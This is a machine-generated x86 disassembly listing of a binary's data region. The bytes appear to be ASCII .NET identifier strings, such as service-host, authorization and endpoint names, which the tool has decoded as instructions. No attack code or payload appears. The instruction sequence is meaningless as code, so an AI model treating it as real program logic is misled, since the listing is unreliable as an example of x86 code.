  40a66e:	fs jae 0x40a671
  40a671:	push   edx
  40a672:	jne    0x40a6e2
  40a674:	je     0x40a6df
  40a676:	ins    DWORD PTR es:[edi],dx
  40a677:	gs push esp
  40a679:	jns    0x40a6eb
  40a67b:	gs dec eax
  40a67d:	popa   
  40a67e:	outs   dx,BYTE PTR ds:[esi]
  40a67f:	fs ins BYTE PTR es:[edi],dx
  40a681:	add    BYTE PTR gs:[edi+0x65],al
  40a685:	je     0x40a6db
  40a687:	jns    0x40a6f9
  40a689:	gs inc esi
  40a68b:	jb     0x40a6fc
  40a68d:	ins    DWORD PTR es:[edi],dx
  40a68e:	dec    eax
  40a68f:	popa   
  40a690:	outs   dx,BYTE PTR ds:[esi]
  40a691:	fs ins BYTE PTR es:[edi],dx
  40a693:	add    BYTE PTR gs:[ebx+0x65],dl
  40a697:	jb     0x40a70f
  40a699:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  40a6a0:	inc    edx
  40a6a1:	popa   
  40a6a2:	jae    0x40a709
  40a6a4:	add    BYTE PTR [ebx+0x65],dl
  40a6a7:	jb     0x40a71f
  40a6a9:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  40a6b0:	outs   dx,DWORD PTR ds:[esi]
  40a6b1:	jb     0x40a71c
  40a6b3:	jp     0x40a716
  40a6b5:	je     0x40a720
  40a6b7:	outs   dx,DWORD PTR ds:[esi]
  40a6b8:	outs   dx,BYTE PTR ds:[esi]
  40a6b9:	inc    edx
  40a6ba:	gs push 0x6f697661
  40a6c0:	jb     0x40a6c2
  40a6c2:	addr16 gs je 0x40a725
  40a6c6:	inc    ecx
  40a6c7:	jne    0x40a73d
  40a6c9:	push   0x7a69726f
  40a6ce:	popa   
  40a6cf:	je     0x40a73a
  40a6d1:	outs   dx,DWORD PTR ds:[esi]
  40a6d2:	outs   dx,BYTE PTR ds:[esi]
  40a6d3:	add    BYTE PTR [ebx+0x65],dh
  40a6d6:	je     0x40a737
  40a6d8:	push   ebx
  40a6d9:	gs jb  0x40a752
  40a6dc:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  40a6e3:	outs   dx,DWORD PTR ds:[esi]
  40a6e4:	jb     0x40a74f
  40a6e6:	jp     0x40a749
  40a6e8:	je     0x40a753
  40a6ea:	outs   dx,DWORD PTR ds:[esi]
  40a6eb:	outs   dx,BYTE PTR ds:[esi]
  40a6ec:	dec    ebp
  40a6ed:	popa   
  40a6ee:	outs   dx,BYTE PTR ds:[esi]
  40a6ef:	popa   
  40a6f0:	addr16 gs jb 0x40a6f4
  40a6f4:	inc    ecx
  40a6f5:	fs fs push ebx
  40a6f8:	gs jb  0x40a771
  40a6fb:	imul   esp,DWORD PTR [ebx+0x65],0x70646e45
  40a702:	outs   dx,DWORD PTR ds:[esi]
  40a703:	imul   ebp,DWORD PTR [esi+0x74],0x79654b00
  40a70a:	gs fs inc edx
  40a70d:	jns    0x40a763
  40a70f:	jns    0x40a781
  40a711:	gs inc ebx
  40a713:	outs   dx,DWORD PTR ds:[esi]
  40a714:	ins    BYTE PTR es:[edi],dx
  40a715:	ins    BYTE PTR es:[edi],dx
  40a716:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a71b:	outs   dx,BYTE PTR ds:[esi]
  40a71c:	pusha  
  40a71d:	xor    DWORD PTR [eax],eax
  40a71f:	addr16 gs je 0x40a782
  40a723:	inc    edx
  40a724:	gs push 0x6f697661
  40a72a:	jb     0x40a79f
  40a72c:	add    BYTE PTR [ebx+0x79],dl
  40a72f:	jae    0x40a7a5
  40a731:	gs ins DWORD PTR es:[edi],dx
  40a733:	cs inc ebx
  40a735:	outs   dx,DWORD PTR ds:[esi]
  40a736:	ins    BYTE PTR es:[edi],dx
  40a737:	ins    BYTE PTR es:[edi],dx
  40a738:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a73d:	outs   dx,BYTE PTR ds:[esi]
  40a73e:	jae    0x40a76e
  40a740:	dec    edi
  40a741:	bound  ebp,QWORD PTR [edx+0x65]
  40a744:	arpl   WORD PTR [ebp+ecx*2+0x6f],si
  40a748:	fs gs ins BYTE PTR es:[edi],dx
  40a74b:	add    BYTE PTR [ebx+0x6f],al
  40a74e:	ins    BYTE PTR es:[edi],dx
  40a74f:	ins    BYTE PTR es:[edi],dx
  40a750:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a755:	outs   dx,BYTE PTR ds:[esi]
  40a756:	pusha  
  40a757:	xor    DWORD PTR [eax],eax
  40a759:	inc    ecx
  40a75a:	fs add BYTE PTR fs:[ebx+0x6f],al
  40a75f:	outs   dx,BYTE PTR ds:[esi]
  40a760:	je     0x40a7d4
  40a762:	popa   
  40a763:	arpl   WORD PTR [esp+eax*2+0x65],si
  40a767:	jae    0x40a7cc
  40a769:	jb     0x40a7d4
  40a76b:	jo     0x40a7e1
  40a76d:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40a774:	pop    edi
  40a775:	inc    ebx
  40a776:	outs   dx,DWORD PTR ds:[esi]
  40a777:	outs   dx,BYTE PTR ds:[esi]
  40a778:	je     0x40a7ec
  40a77a:	popa   
  40a77b:	arpl   WORD PTR [eax+eax*1+0x4f],si
  40a77f:	jo     0x40a7e6
  40a781:	jb     0x40a7e4
  40a783:	je     0x40a7ee
  40a785:	outs   dx,DWORD PTR ds:[esi]
  40a786:	outs   dx,BYTE PTR ds:[esi]
  40a787:	inc    esp
  40a788:	gs jae 0x40a7ee
  40a78b:	jb     0x40a7f6
  40a78d:	jo     0x40a803
  40a78f:	imul   ebp,DWORD PTR [edi+0x6e],0x6c6c6f43
  40a796:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a79b:	outs   dx,BYTE PTR ds:[esi]
  40a79c:	add    BYTE PTR [edi+0x65],ah
  40a79f:	je     0x40a800
  40a7a1:	dec    edi
  40a7a2:	jo     0x40a809
  40a7a4:	jb     0x40a807
  40a7a6:	je     0x40a811
  40a7a8:	outs   dx,DWORD PTR ds:[esi]
  40a7a9:	outs   dx,BYTE PTR ds:[esi]
  40a7aa:	jae    0x40a7ac
  40a7ac:	dec    edi
  40a7ad:	jo     0x40a814
  40a7af:	jb     0x40a812
  40a7b1:	je     0x40a81c
  40a7b3:	outs   dx,DWORD PTR ds:[esi]
  40a7b4:	outs   dx,BYTE PTR ds:[esi]
  40a7b5:	inc    esp
  40a7b6:	gs jae 0x40a81c
  40a7b9:	jb     0x40a824
  40a7bb:	jo     0x40a831
  40a7bd:	imul   ebp,DWORD PTR [edi+0x6e],0x6e694600
  40a7c4:	add    BYTE PTR fs:[ecx+0x4f],cl
  40a7c8:	jo     0x40a82f
  40a7ca:	jb     0x40a82d
  40a7cc:	je     0x40a837
  40a7ce:	outs   dx,DWORD PTR ds:[esi]
  40a7cf:	outs   dx,BYTE PTR ds:[esi]
  40a7d0:	inc    edx
  40a7d1:	gs push 0x6f697661
  40a7d7:	jb     0x40a7d9
  40a7d9:	inc    esp
  40a7da:	popa   
  40a7db:	je     0x40a83e
  40a7dd:	inc    ebx
  40a7de:	outs   dx,DWORD PTR ds:[esi]
  40a7df:	outs   dx,BYTE PTR ds:[esi]
  40a7e0:	je     0x40a854
  40a7e2:	popa   
  40a7e3:	arpl   WORD PTR [ebx+edx*2+0x65],si
  40a7e7:	jb     0x40a852
  40a7e9:	popa   
  40a7ea:	ins    BYTE PTR es:[edi],dx
  40a7eb:	imul   edi,DWORD PTR [edx+0x65],0x65704f72
  40a7f2:	jb     0x40a855
  40a7f4:	je     0x40a85f
  40a7f6:	outs   dx,DWORD PTR ds:[esi]
  40a7f7:	outs   dx,BYTE PTR ds:[esi]
  40a7f8:	inc    edx
  40a7f9:	gs push 0x6f697661
  40a7ff:	jb     0x40a801
  40a801:	push   edi
  40a802:	outs   dx,DWORD PTR ds:[esi]
  40a803:	jb     0x40a870
  40a805:	dec    ecx
  40a806:	je     0x40a86d
  40a808:	ins    DWORD PTR es:[edi],dx
  40a809:	inc    esp
  40a80a:	popa   
  40a80b:	je     0x40a86e
  40a80d:	inc    ebx
  40a80e:	outs   dx,DWORD PTR ds:[esi]
  40a80f:	outs   dx,BYTE PTR ds:[esi]
  40a810:	je     0x40a884
  40a812:	popa   
  40a813:	arpl   WORD PTR [edx+edx*2+0x65],si
  40a817:	jae    0x40a888
  40a819:	ins    BYTE PTR es:[edi],dx
  40a81a:	jbe    0x40a881
  40a81c:	jb     0x40a81e
  40a81e:	inc    esp
  40a81f:	popa   
  40a820:	je     0x40a883
  40a822:	inc    ebx
  40a823:	outs   dx,DWORD PTR ds:[esi]
  40a824:	outs   dx,BYTE PTR ds:[esi]
  40a825:	je     0x40a899
  40a827:	popa   
  40a828:	arpl   WORD PTR [edx+edx*2+0x65],si
  40a82c:	jae    0x40a89d
  40a82e:	ins    BYTE PTR es:[edi],dx
  40a82f:	jbe    0x40a896
  40a831:	jb     0x40a833
  40a833:	jae    0x40a89a
  40a835:	je     0x40a896
  40a837:	inc    esp
  40a838:	popa   
  40a839:	je     0x40a89c
  40a83b:	inc    ebx
  40a83c:	outs   dx,DWORD PTR ds:[esi]
  40a83d:	outs   dx,BYTE PTR ds:[esi]
  40a83e:	je     0x40a8b2
  40a840:	popa   
  40a841:	arpl   WORD PTR [edx+edx*2+0x65],si
  40a845:	jae    0x40a8b6
  40a847:	ins    BYTE PTR es:[edi],dx
  40a848:	jbe    0x40a8af
  40a84a:	jb     0x40a84c
  40a84c:	arpl   WORD PTR cs:[ebx+0x74],sp
  40a850:	outs   dx,DWORD PTR ds:[esi]
  40a851:	jb     0x40a853
  40a853:	inc    esp
  40a854:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  40a85b:	push   edx
  40a85c:	jne    0x40a8cc
  40a85e:	je     0x40a8c9
  40a860:	ins    DWORD PTR es:[edi],dx
  40a861:	add    BYTE PTR gs:[edi+0x65],ah
  40a865:	je     0x40a8c6
  40a867:	inc    esp
  40a868:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  40a86f:	push   edx
  40a870:	jne    0x40a8e0
  40a872:	je     0x40a8dd
  40a874:	ins    DWORD PTR es:[edi],dx
  40a875:	add    BYTE PTR gs:[ebx+0x65],dh
  40a879:	je     0x40a8da
  40a87b:	dec    ecx
  40a87c:	outs   dx,BYTE PTR ds:[esi]
  40a87d:	jae    0x40a8f3
  40a87f:	popa   
  40a880:	outs   dx,BYTE PTR ds:[esi]
  40a881:	arpl   WORD PTR [ebp+0x50],sp
  40a884:	jb     0x40a8f5
  40a886:	jbe    0x40a8f1
  40a888:	fs gs jb 0x40a88c
  40a88c:	push   ebx
  40a88d:	jns    0x40a8fd
  40a88f:	arpl   WORD PTR [eax+0x72],bp
  40a892:	outs   dx,DWORD PTR ds:[esi]
  40a893:	outs   dx,BYTE PTR ds:[esi]
  40a894:	imul   edi,DWORD PTR [edx+0x65],0x6c6f4364
  40a89b:	ins    BYTE PTR es:[edi],dx
  40a89c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a8a1:	outs   dx,BYTE PTR ds:[esi]
  40a8a2:	pusha  
  40a8a3:	xor    DWORD PTR [eax],eax
  40a8a5:	addr16 gs je 0x40a908
  40a8a9:	dec    ebp
  40a8aa:	gs jae 0x40a920
  40a8ad:	popa   
  40a8ae:	addr16 gs dec ecx
  40a8b1:	outs   dx,BYTE PTR ds:[esi]
  40a8b2:	jae    0x40a924
  40a8b4:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  40a8b9:	jae    0x40a8bb
  40a8bb:	dec    ebp
  40a8bc:	gs jae 0x40a932
  40a8bf:	popa   
  40a8c0:	addr16 gs dec eax
  40a8c3:	gs popa 
  40a8c5:	fs gs jb 0x40a93c
  40a8c9:	add    BYTE PTR [edi+0x65],ah
  40a8cc:	je     0x40a92d
  40a8ce:	dec    eax
  40a8cf:	gs popa 
  40a8d1:	fs gs jb 0x40a948
  40a8d5:	add    BYTE PTR [esi+0x69],al
  40a8d8:	outs   dx,BYTE PTR ds:[esi]
  40a8d9:	fs dec eax
  40a8db:	gs popa 
  40a8dd:	fs gs jb 0x40a8e1
  40a8e1:	inc    edi
  40a8e2:	gs je  0x40a92d
  40a8e5:	gs popa 
  40a8e7:	fs gs jb 0x40a8eb
  40a8eb:	addr16 gs je 0x40a94e
  40a8ef:	inc    ebx
  40a8f0:	jne    0x40a964
  40a8f2:	jb     0x40a959
  40a8f4:	outs   dx,BYTE PTR ds:[esi]
  40a8f5:	je     0x40a94b
  40a8f7:	push   0x64616572
  40a8fc:	add    BYTE PTR [edi+0x65],al
  40a8ff:	je     0x40a944
  40a901:	jne    0x40a96f
  40a903:	je     0x40a97a
  40a905:	jb     0x40a96c
  40a907:	dec    ecx
  40a908:	outs   dx,BYTE PTR ds:[esi]
  40a909:	outs   dx,WORD PTR ds:[esi]
  40a90b:	add    BYTE PTR [ebx+0x65],dh
  40a90e:	je     0x40a96f
  40a910:	inc    ebx
  40a911:	jne    0x40a985
  40a913:	jb     0x40a97a
  40a915:	outs   dx,BYTE PTR ds:[esi]
  40a916:	je     0x40a95b
  40a918:	jne    0x40a986
  40a91a:	je     0x40a991
  40a91c:	jb     0x40a983
  40a91e:	add    BYTE PTR [ebx+0x65],dh
  40a921:	je     0x40a982
  40a923:	inc    ebx
  40a924:	jne    0x40a998
  40a926:	jb     0x40a98d
  40a928:	outs   dx,BYTE PTR ds:[esi]
  40a929:	je     0x40a980
  40a92b:	dec    ecx
  40a92c:	inc    ebx
  40a92d:	jne    0x40a99b
  40a92f:	je     0x40a9a6
  40a931:	jb     0x40a998
  40a933:	add    BYTE PTR [ebx+0x65],dl
  40a936:	jb     0x40a9ae
  40a938:	imul   esp,DWORD PTR [ebx+0x65],0x75636553
  40a93f:	jb     0x40a9aa
  40a941:	je     0x40a9bc
  40a943:	inc    ebx
  40a944:	outs   dx,DWORD PTR ds:[esi]
  40a945:	outs   dx,BYTE PTR ds:[esi]
  40a946:	je     0x40a9ad
  40a948:	js     0x40a9be
  40a94a:	add    BYTE PTR [edi+0x65],ah
  40a94d:	je     0x40a9ae
  40a94f:	push   ebx
  40a950:	gs jb  0x40a9c9
  40a953:	imul   esp,DWORD PTR [ebx+0x65],0x75636553
  40a95a:	jb     0x40a9c5
  40a95c:	je     0x40a9d7
  40a95e:	inc    ebx
  40a95f:	outs   dx,DWORD PTR ds:[esi]
  40a960:	outs   dx,BYTE PTR ds:[esi]
  40a961:	je     0x40a9c8
  40a963:	js     0x40a9d9
  40a965:	add    BYTE PTR [edi+0x65],ah
  40a968:	je     0x40a9c9
  40a96a:	dec    ecx
  40a96b:	jae    0x40a9ae
  40a96d:	outs   dx,BYTE PTR ds:[esi]
  40a96e:	outs   dx,DWORD PTR ds:[esi]
  40a96f:	outs   dx,BYTE PTR ds:[esi]
  40a970:	jns    0x40a9df
  40a972:	outs   dx,DWORD PTR ds:[esi]
  40a973:	jne    0x40a9e8
  40a975:	add    BYTE PTR [edi+0x69],dl
  40a978:	outs   dx,BYTE PTR ds:[esi]
  40a979:	outs   dx,DWORD PTR fs:[esi]
  40a97b:	ja     0x40a9f0
  40a97d:	dec    ecx
  40a97e:	fs outs dx,BYTE PTR gs:[esi]
  40a981:	je     0x40a9ec
  40a983:	je     0x40a9fe
  40a985:	add    BYTE PTR [edi+0x65],ah
  40a988:	je     0x40a9e9
  40a98a:	push   edi
  40a98b:	imul   ebp,DWORD PTR [esi+0x64],0x4973776f
  40a992:	fs outs dx,BYTE PTR gs:[esi]
  40a995:	je     0x40aa00
  40a997:	je     0x40aa12
  40a999:	add    BYTE PTR [edi+0x65],ah
  40a99c:	je     0x40a9fd
  40a99e:	push   ebp
  40a99f:	jae    0x40aa06
  40a9a1:	jb     0x40a9a3
  40a9a3:	outs   dx,DWORD PTR ds:[esi]
  40a9a4:	jo     0x40aa05
  40a9a6:	dec    ecx
  40a9a7:	outs   dx,BYTE PTR ds:[esi]
  40a9a8:	gs jno 0x40aa20
  40a9ab:	popa   
  40a9ac:	ins    BYTE PTR es:[edi],dx
  40a9ad:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x5f746567
  40a9b5:	dec    ecx
  40a9b6:	outs   dx,BYTE PTR ds:[esi]
  40a9b7:	arpl   WORD PTR [edi+0x6d],bp
  40a9ba:	imul   ebp,DWORD PTR [esi+0x67],0x7373654d
  40a9c1:	popa   
  40a9c2:	addr16 gs dec eax
  40a9c5:	gs popa 
  40a9c7:	fs gs jb 0x40aa3e
  40a9cb:	add    BYTE PTR [ebx+0x6c],al
  40a9ce:	imul   esp,DWORD PTR [ebp+0x6e],0x48644974
  40a9d5:	gs popa 
  40a9d7:	fs gs jb 0x40a9db
  40a9db:	push   edx
  40a9dc:	gs popa 
  40a9de:	fs dec eax
  40a9e0:	gs popa 
  40a9e2:	fs gs jb 0x40a9e6
  40a9e6:	addr16 gs je 0x40aa49
  40a9ea:	inc    esi
  40a9eb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  40a9f3:	addr16 gs je 0x40aa56
  40a9f7:	dec    esp
  40a9f8:	imul   ebp,DWORD PTR [esi+0x65],0x74656700
  40a9ff:	pop    edi
  40aa00:	inc    ebx
  40aa01:	outs   dx,DWORD PTR ds:[esi]
  40aa02:	ins    BYTE PTR es:[edi],dx
  40aa03:	jne    0x40aa72
  40aa05:	outs   dx,BYTE PTR ds:[esi]
  40aa06:	add    BYTE PTR [edi+0x65],ah
  40aa09:	je     0x40aa6a
  40aa0b:	inc    ebp
  40aa0c:	jb     0x40aa80
  40aa0e:	outs   dx,DWORD PTR ds:[esi]
  40aa0f:	jb     0x40aa5f
  40aa11:	jne    0x40aa80
  40aa13:	bound  esp,QWORD PTR [ebp+0x72]
  40aa16:	add    BYTE PTR [edi+0x65],ah
  40aa19:	je     0x40aa7a
  40aa1b:	dec    ecx
  40aa1c:	jae    0x40aa75
  40aa1e:	popa   
  40aa1f:	jb     0x40aa8f
  40aa21:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  40aa28:	pop    edi
  40aa29:	inc    ebp
  40aa2a:	jb     0x40aa9e
  40aa2c:	outs   dx,DWORD PTR ds:[esi]
  40aa2d:	jb     0x40aa83
  40aa2f:	gs js  0x40aaa6
  40aa32:	add    BYTE PTR [edi+0x65],ah
  40aa35:	je     0x40aa96
  40aa37:	push   esi
  40aa38:	imul   esi,DWORD PTR [edx+0x74],0x506c6175
  40aa3f:	popa   
  40aa40:	je     0x40aaaa
  40aa42:	add    BYTE PTR [edi+0x65],ah
  40aa45:	je     0x40aaa6
  40aa47:	inc    esi
  40aa48:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0x656d61
  40aa50:	addr16 gs je 0x40aab3
  40aa54:	inc    edx
  40aa55:	popa   
  40aa56:	jb     0x40aabd
  40aa58:	dec    ebp
  40aa59:	gs jae 0x40aacf
  40aa5c:	popa   
  40aa5d:	add    BYTE PTR gs:[di+0x6d],al
  40aa62:	jo     0x40aad8
  40aa64:	jns    0x40aa66
  40aa66:	push   esp
  40aa67:	outs   dx,DWORD PTR ds:[esi]
  40aa68:	outs   dx,DWORD PTR ds:[esi]
  40aa69:	ins    BYTE PTR es:[edi],dx
  40aa6a:	dec    esp
  40aa6b:	outs   dx,DWORD PTR ds:[esi]
  40aa6c:	arpl   WORD PTR [ecx+0x74],sp
  40aa6f:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  40aa76:	gs jb  0x40aa79
  40aa79:	inc    edi
  40aa7a:	gs je  0x40aacd
  40aa7d:	popa   
  40aa7e:	je     0x40aae8
  40aa80:	push   esp
  40aa81:	outs   dx,DWORD PTR ds:[esi]
  40aa82:	push   edx
  40aa83:	gs data16 gs jb 0x40aaed
  40aa88:	outs   dx,BYTE PTR ds:[esi]
  40aa89:	arpl   WORD PTR [ebp+0x41],sp
  40aa8c:	jae    0x40ab01
  40aa8e:	gs ins DWORD PTR es:[edi],dx
  40aa90:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  40aa94:	jae    0x40aa96
  40aa96:	dec    ecx
  40aa97:	inc    ebx
  40aa98:	outs   dx,DWORD PTR ds:[esi]
  40aa99:	ins    BYTE PTR es:[edi],dx
  40aa9a:	ins    BYTE PTR es:[edi],dx
  40aa9b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40aaa0:	outs   dx,BYTE PTR ds:[esi]
  40aaa1:	pusha  
  40aaa2:	xor    DWORD PTR [eax],eax
  40aaa4:	addr16 gs je 0x40ab07
  40aaa8:	inc    ebx
  40aaa9:	outs   dx,DWORD PTR ds:[esi]
  40aaaa:	jne    0x40ab1a
  40aaac:	je     0x40aaae
  40aaae:	dec    ecx
  40aaaf:	inc    ebp
  40aab0:	jno    0x40ab27
  40aab2:	popa   
  40aab3:	ins    BYTE PTR es:[edi],dx
  40aab4:	imul   esi,DWORD PTR [ecx+edi*2+0x43],0x61706d6f
  40aabc:	jb     0x40ab23
  40aabe:	jb     0x40ab20
  40aac0:	xor    DWORD PTR [eax],eax
  40aac2:	dec    ecx
  40aac3:	inc    ebp
  40aac4:	outs   dx,BYTE PTR ds:[esi]
  40aac5:	jne    0x40ab34
  40aac7:	gs jb  0x40ab2b
  40aaca:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  40aace:	xor    DWORD PTR [eax],eax
  40aad0:	dec    ecx
  40aad1:	inc    ebp
  40aad2:	outs   dx,BYTE PTR ds:[esi]
  40aad3:	jne    0x40ab42
  40aad5:	gs jb  0x40ab39
  40aad8:	je     0x40ab49
  40aada:	jb     0x40ab3c
  40aadc:	xor    DWORD PTR [eax],eax
  40aade:	inc    edi
  40aadf:	gs je  0x40ab27
  40aae2:	outs   dx,BYTE PTR ds:[esi]
  40aae3:	jne    0x40ab52
  40aae5:	gs jb  0x40ab49
  40aae8:	je     0x40ab59
  40aaea:	jb     0x40aaec
  40aaec:	addr16 gs je 0x40ab4f
  40aaf0:	inc    ebx
  40aaf1:	jne    0x40ab65
  40aaf3:	jb     0x40ab5a
  40aaf5:	outs   dx,BYTE PTR ds:[esi]
  40aaf6:	je     0x40aaf8
  40aaf8:	inc    ecx
  40aaf9:	fs fs push edx
  40aafc:	popa   
  40aafd:	outs   dx,BYTE PTR ds:[esi]
  40aafe:	add    BYTE PTR gs:[bx+di+0x45],cl
  40ab03:	outs   dx,BYTE PTR ds:[esi]
  40ab04:	jne    0x40ab73
  40ab06:	gs jb  0x40ab6a
  40ab09:	je     0x40ab7a
  40ab0b:	jb     0x40ab0d
  40ab0d:	dec    ebp
  40ab0e:	outs   dx,DWORD PTR ds:[esi]
  40ab0f:	jbe    0x40ab76
  40ab11:	dec    esi
  40ab12:	gs js  0x40ab89
  40ab15:	add    BYTE PTR [edi+0x65],ah
  40ab18:	je     0x40ab79
  40ab1a:	dec    ecx
  40ab1b:	je     0x40ab82
  40ab1d:	ins    DWORD PTR es:[edi],dx
  40ab1e:	add    BYTE PTR [ebp+0x6e],al
  40ab21:	fs jae 0x40ab7b
  40ab24:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x50746547
  40ab2c:	popa   
  40ab2d:	je     0x40ab97
  40ab2f:	push   esp
  40ab30:	outs   dx,DWORD PTR ds:[esi]
  40ab31:	inc    esp
  40ab32:	outs   dx,DWORD PTR ds:[esi]
  40ab33:	je     0x40ab83
  40ab35:	gs je  0x40ab7e
  40ab38:	jb     0x40ab9b
  40ab3a:	ins    DWORD PTR es:[edi],dx
  40ab3b:	gs ja  0x40abad
  40ab3e:	jb     0x40abab
  40ab40:	add    BYTE PTR [ecx+ebp*2+0x72],al
  40ab44:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  40ab49:	jns    0x40ab94
  40ab4b:	outs   dx,BYTE PTR ds:[esi]
  40ab4c:	outs   dx,WORD PTR ds:[esi]
  40ab4e:	add    BYTE PTR [esi+0x69],al
  40ab51:	ins    BYTE PTR es:[edi],dx
  40ab52:	gs dec ecx
  40ab54:	outs   dx,BYTE PTR ds:[esi]
  40ab55:	outs   dx,WORD PTR ds:[esi]
  40ab57:	add    BYTE PTR [edi+0x65],al
  40ab5a:	je     0x40aba2
  40ab5c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x6c694600
  40ab64:	gs push ebx
  40ab66:	jns    0x40abdb
  40ab68:	je     0x40abcf
  40ab6a:	ins    DWORD PTR es:[edi],dx
  40ab6b:	dec    ecx
  40ab6c:	outs   dx,BYTE PTR ds:[esi]
  40ab6d:	outs   dx,WORD PTR ds:[esi]
  40ab6f:	add    BYTE PTR [edi+0x65],ah
  40ab72:	je     0x40abd3
  40ab74:	inc    ebp
  40ab75:	js     0x40abeb
  40ab77:	outs   dx,BYTE PTR gs:[esi]
  40ab79:	jae    0x40abe4
  40ab7b:	outs   dx,DWORD PTR ds:[esi]
  40ab7c:	outs   dx,BYTE PTR ds:[esi]
  40ab7d:	add    BYTE PTR [ebx+0x6f],al
  40ab80:	outs   dx,BYTE PTR ds:[esi]
  40ab81:	je     0x40abe4
  40ab83:	imul   ebp,DWORD PTR [esi+0x73],0x79654b
  40ab8a:	jae    0x40abf1
  40ab8c:	je     0x40abed
  40ab8e:	dec    ecx
  40ab8f:	je     0x40abf6
  40ab91:	ins    DWORD PTR es:[edi],dx
  40ab92:	add    BYTE PTR [esi+0x69],al
  40ab95:	ins    BYTE PTR es:[edi],dx
  40ab96:	add    BYTE PTR gs:[ebp+0x78],al
  40ab9a:	imul   esi,DWORD PTR [ebx+0x74],0x6f430073
  40aba1:	ins    DWORD PTR es:[edi],dx
  40aba2:	bound  ebp,QWORD PTR [ecx+0x6e]
  40aba5:	add    BYTE PTR gs:[edi+0x65],ah
  40aba9:	je     0x40ac0a
  40abab:	dec    ecx
  40abac:	outs   dx,BYTE PTR ds:[esi]
  40abad:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x61654c6c
  40abb5:	jae    0x40ac1c
  40abb7:	push   esp
  40abb8:	imul   ebp,DWORD PTR [ebp+0x65],0x4e734900
  40abbf:	jne    0x40ac2d
  40abc1:	ins    BYTE PTR es:[edi],dx
  40abc2:	dec    edi
  40abc3:	jb     0x40ac0a
  40abc5:	ins    DWORD PTR es:[edi],dx
  40abc6:	jo     0x40ac3c
  40abc8:	jns    0x40abca
  40abca:	inc    ebx
  40abcb:	push   0x4d007261
  40abd0:	outs   dx,DWORD PTR ds:[esi]
  40abd1:	outs   dx,BYTE PTR ds:[esi]
  40abd2:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x746e4500
  40abda:	gs jb  0x40abdd
  40abdd:	addr16 gs je 0x40ac40
  40abe1:	inc    edi
  40abe2:	push   ebp
  40abe3:	dec    ecx
  40abe4:	inc    esp
  40abe5:	add    BYTE PTR [ebx+0x56],dl
  40abe8:	jae    0x40ac2e
  40abea:	gs jae 0x40ac56
  40abed:	outs   dx,BYTE PTR ds:[si]
  40abef:	push   esp
  40abf0:	imul   ebp,DWORD PTR [ebp+0x65],0x65737341
  40abf7:	ins    DWORD PTR es:[edi],dx
  40abf8:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  40abfc:	gs jae 0x40ac6e
  40abff:	ins    BYTE PTR es:[edi],dx
  40ac00:	jne    0x40ac76
  40ac02:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  40ac09:	inc    esi
  40ac0a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  40ac12:	dec    esp
  40ac13:	outs   dx,DWORD PTR ds:[esi]
  40ac14:	popa   
  40ac15:	add    BYTE PTR fs:[edx+0x73],ah
  40ac19:	je     0x40ac8d
  40ac1b:	dec    edi
  40ac1c:	jb     0x40ac87
  40ac1e:	addr16 inc ecx
  40ac20:	jae    0x40ac95
  40ac22:	gs ins DWORD PTR es:[edi],dx
  40ac24:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  40ac28:	jo     0x40ac8f
  40ac2a:	arpl   WORD PTR [eax],ax
  40ac2c:	bound  esi,QWORD PTR [ebx+0x74]
  40ac2f:	jb     0x40ac83
  40ac31:	gs jae 0x40aca3
  40ac34:	ins    BYTE PTR es:[edi],dx
  40ac35:	jbe    0x40ac9c
  40ac37:	fs inc ecx
  40ac39:	jae    0x40acae
  40ac3b:	gs ins DWORD PTR es:[edi],dx
  40ac3d:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  40ac41:	popa   
  40ac42:	je     0x40acac
  40ac44:	add    BYTE PTR [ecx+0x72],al
  40ac47:	jb     0x40acaa
  40ac49:	jns    0x40ac4b
  40ac4b:	inc    edi
  40ac4c:	gs je  0x40ac9b
  40ac4f:	outs   dx,BYTE PTR gs:[esi]
  40ac51:	addr16 je 0x40acbc
  40ac54:	add    BYTE PTR [edx+esi*2+0x79],dl
  40ac58:	inc    edi
  40ac59:	gs je  0x40acb2
  40ac5c:	popa   
  40ac5d:	ins    BYTE PTR es:[edi],dx
  40ac5e:	jne    0x40acc5
  40ac60:	add    BYTE PTR [ebp+0x6e],al
  40ac63:	jne    0x40acd2
  40ac65:	gs jb  0x40acc9
  40ac68:	je     0x40acd9
  40ac6a:	jb     0x40ac6c
  40ac6c:	dec    ebx
  40ac6d:	gs jns 0x40acc6
  40ac70:	popa   
  40ac71:	ins    BYTE PTR es:[edi],dx
  40ac72:	jne    0x40acd9
  40ac74:	push   eax
  40ac75:	popa   
  40ac76:	imul   esi,DWORD PTR [edx+0x60],0x65670032
  40ac7d:	je     0x40acde
  40ac7f:	push   esi
  40ac80:	popa   
  40ac81:	ins    BYTE PTR es:[edi],dx
  40ac82:	jne    0x40ace9
  40ac84:	add    BYTE PTR [ecx+0x73],cl
  40ac87:	push   eax
  40ac88:	popa   
